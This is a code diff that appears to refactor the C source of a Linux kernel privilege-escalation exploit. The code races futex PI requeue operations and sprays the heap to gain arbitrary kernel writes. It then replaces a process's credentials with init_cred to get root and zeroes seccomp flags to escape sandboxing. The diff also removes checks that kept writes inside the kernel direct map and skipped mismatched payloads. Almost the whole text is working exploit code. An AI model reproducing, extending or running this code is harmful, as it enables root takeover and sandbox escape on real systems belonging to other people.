@@ -253,12 +253,6 @@ static double timer_ms(void) {
     log_sync(); \
   } while (0)
 
-extern int pselect_custom_write;
-extern uintptr_t pselect_custom_target;
-extern int pselect_child_node;
-void set_pselect_write_mode(uintptr_t target, int mode);
-void clear_pselect_write(void);
-
 uint32_t f_wait;
 uint32_t f_pi_target;
 uint32_t f_pi_chain;
@@ -282,7 +276,8 @@ int memfd_leak;
  * Input: currently implicit race/session state; output: completion/status.
  * Future: pi_race_waiter_worker(void *PiRaceWorkerArgs); route dispatch moves
  * to the stage controller. */
-void *waiter_thread(void *arg __attribute__((unused))) {
+void *waiter_thread(void *arg) {
+  const WriteRequest *request = arg;
   disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
   atomic_store(&waiter_tid, tid);
@@ -304,7 +299,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
   if (kernel5_route_selected()) {
-    do_kernel5_fake_lock_route();
+    do_kernel5_fake_lock_route(request);
     /* remove_waiter() left this thread's pi_blocked_on pointing at the
      * reclaimed stack waiter. Force one final slow-path removal while the
      * stack frame is still alive, matching the 5.x multicast primitive's
@@ -316,9 +311,9 @@ void *waiter_thread(void *arg __attribute__((unused))) {
     long disarm = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
     pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
   } else if (tcp_route_selected()) {
-    do_tcp_fake_lock_route();
+    do_tcp_fake_lock_route(request);
   } else {
-    do_pselect_fake_lock_route();
+    do_pselect_fake_lock_route(request);
   }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
@@ -416,11 +411,11 @@ void reset_main_route_state(void) {
 /* Decoupling plan: create, synchronize and join one PI race. Inputs: race and
  * selected route contexts; output: RouteStatus. Future: pi_race_run(), with
  * partial-thread-start cleanup and no route_last_* globals. */
-int run_main_route_threads(void) {
+int run_main_route_threads(const WriteRequest *request) {
   reset_main_route_state();
   pthread_t waiter, owner, consumer;
   pr_info("[route] creating waiter/owner/consumer\n");
-  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
+  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, (void *)request));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
@@ -452,46 +447,32 @@ int run_main_route_threads(void) {
 /* Decoupling plan: prepare payload and execute one abstract kernel write.
  * Inputs: session and immutable WriteRequest; output: RouteStatus. Future:
  * exploit_execute_write(session, request), separating heap and route phases. */
-static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
-  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
-  if (!in_direct_map(target)) {
-    pr_warning("  target is outside the direct map, not writing\n");
-    return 0;
-  }
+static int do_one_write(const WriteRequest *request, const char *desc) {
+  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
+          request->target, request->mode, !request->preserve_child);
   /* Both transports write *(target) := value through the erase left-only
    * relink: waiter words are {pc = value, right = 0, left = target} and
    * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
-  pselect_child_node = leaf ? 0 : 1;
-  set_pselect_write_mode(target, mode);
   if (kernel5_route_selected() &&
       g_runtime_config.multicast_resident_enabled) {
     if (!kernel5_resident_start()) {
       pr_warning("5.x resident multicast setup failed\n");
-      clear_pselect_write();
       return 0;
     }
-    uintptr_t value = leaf ? 0 : (mode == 2 ? data_addr(g_init_cred_image)
-                                             : data_addr(EMPTY_ZERO_PAGE));
-    int ok = kernel5_resident_write(target, value);
-    clear_pselect_write();
+    uintptr_t value = !request->preserve_child
+        ? 0
+        : (request->mode == WRITE_MODE_CREDENTIAL
+               ? data_addr(g_init_cred_image)
+               : data_addr(EMPTY_ZERO_PAGE));
+    int ok = kernel5_resident_write(request->target, value);
     return ok;
   }
   TIMER("  heap spray start");
-  page_base = prepare_good_kernel_page();
-  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
+  page_base = prepare_good_kernel_page(request);
+  if (!page_base) { pr_warning("  heap spray failed\n"); return 0; }
   TIMER("  heap spray done");
-  /* only the leaf arm stores zero, and the value arm does not, so a leaf
-   * payload fired at a value target zeroes it */
-  int arm_matches = leaf ? (fake_right == 0) : (fake_right != 0);
-  if (!arm_matches) {
-    pr_warning("  payload arm mismatch leaf=%d fake_right=%016zx; skipping "
-               "write\n", leaf, fake_right);
-    clear_pselect_write();
-    return 0;
-  }
-  int routed = run_main_route_threads();
+  int routed = run_main_route_threads(request);
   TIMER("  PI route done");
-  clear_pselect_write();
   if (!routed) {
     pr_warning("  PI route did not produce a verified write\n");
   }
@@ -998,13 +979,8 @@ static int retry_write_stage(
     const char *stage, uintptr_t target, int mode, int attempts,
     useconds_t settle_usec, write_stage_verify_fn verify, void *context,
     int leaf) {
-  /* no attempt can move a target that is wrong by construction, and the
-   * stage belongs in the log with the address rather than the route */
-  if (!in_direct_map(target)) {
-    pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n",
-               stage, target);
-    return 0;
-  }
+  const WriteRequest request =
+      write_request_make(target, (WriteMode)mode, leaf);
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
     /* the previous attempt's write can land after its verify read; check
@@ -1012,10 +988,9 @@ static int retry_write_stage(
     if (attempt > 1 && verify(context)) return 1;
     if (attempt == 1) slab_drain();
     if (mode == 2 && kernel5_route_selected()) {
-      pselect_child_node = 0;
-      set_pselect_write_mode(data_addr(g_init_cred_image) + 8, 1);
-      page_base = prepare_good_kernel_page();
-      clear_pselect_write();
+      const WriteRequest repair_request = write_request_make(
+          data_addr(g_init_cred_image) + 8, WRITE_MODE_ZERO, 1);
+      page_base = prepare_good_kernel_page(&repair_request);
       if (!page_base || !stash_prebuilt_page()) {
         pr_warning("W2 fast repair prebuild failed\n");
         discard_prebuilt_page();
@@ -1023,7 +998,7 @@ static int retry_write_stage(
       }
       pr_info("W2 fast repair payload prebuilt\n");
     }
-    int routed = do_one_write(target, stage, mode, leaf);
+    int routed = do_one_write(&request, stage);
     if (!routed) {
       discard_prebuilt_page();
       pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
@@ -1038,13 +1013,12 @@ static int retry_write_stage(
         pr_warning("W2 fast repair activation failed\n");
         return 0;
       }
-      pselect_child_node = 0;
-      set_pselect_write_mode(data_addr(g_init_cred_image) + 8, 1);
+      const WriteRequest repair_request = write_request_make(
+          data_addr(g_init_cred_image) + 8, WRITE_MODE_ZERO, 1);
       pr_info("W2b: firing prebuilt init_cred+8 repair\n");
       atomic_store(&fast_repair_route, 1);
-      int repaired = run_main_route_threads();
+      int repaired = run_main_route_threads(&repair_request);
       atomic_store(&fast_repair_route, 0);
-      clear_pselect_write();
       if (!repaired) {
         pr_warning("W2 fast repair route failed\n");
         return 0;
@@ -1231,8 +1205,9 @@ int run_exploit(int argc, char **argv) {
       int repaired = 0;
       for (int repair_try = 1; repair_try <= 3; repair_try++) {
         pr_info("W1b: private scratch repair attempt %d/3\n", repair_try);
-        if (do_one_write(w1_scratch_poison,
-                         "W1b: private scratch repair", 1, 1)) {
+        const WriteRequest scratch_repair = write_request_make(
+            w1_scratch_poison, WRITE_MODE_ZERO, 1);
+        if (do_one_write(&scratch_repair, "W1b: private scratch repair")) {
           repaired = 1;
           break;
         }
@@ -1355,13 +1330,16 @@ int run_exploit(int argc, char **argv) {
     int vr_ok = 1;
     if (vr_needed) {
       /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
-      vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
-                            "VR: flags+tagA", 1, 1);
+      const WriteRequest flags_request = write_request_make(
+          child_task + TASK_THREAD_INFO_FLAGS_OFF, WRITE_MODE_ZERO, 1);
+      vr_ok &= do_one_write(&flags_request, "VR: flags+tagA");
 
       /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
       if (vr_ok) {
         uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
-        vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+        const WriteRequest tagb_request =
+            write_request_make(tagb_align, WRITE_MODE_ZERO, 1);
+        vr_ok &= do_one_write(&tagb_request, "VR: tagB");
       }
 
       if (vr_ok) {
@@ -1372,8 +1350,6 @@ int run_exploit(int argc, char **argv) {
     }
   }
 #endif
-
-    pselect_child_node = 1;
 
     int got_root = retry_write_stage(
         "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
@@ -1433,14 +1409,18 @@ int run_exploit(int argc, char **argv) {
     for (int attempt = 1; attempt <= 6; attempt++) {
       pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
       if (attempt == 1) slab_drain();
-      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
+      const WriteRequest flags_request =
+          write_request_make(flags_target, WRITE_MODE_ZERO, 1);
+      int routed = do_one_write(&flags_request, "W3: TIF_SECCOMP");
       if (!routed) {
         pr_warning("W3 attempt %d route failed; backing off\n", attempt);
         usleep(100000);
         continue;
       }
       usleep(50000);
-      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
+      const WriteRequest mode_request =
+          write_request_make(mode_target, WRITE_MODE_ZERO, 1);
+      routed = do_one_write(&mode_request, "W3: seccomp mode");
       if (!routed) {
         pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
         usleep(100000);
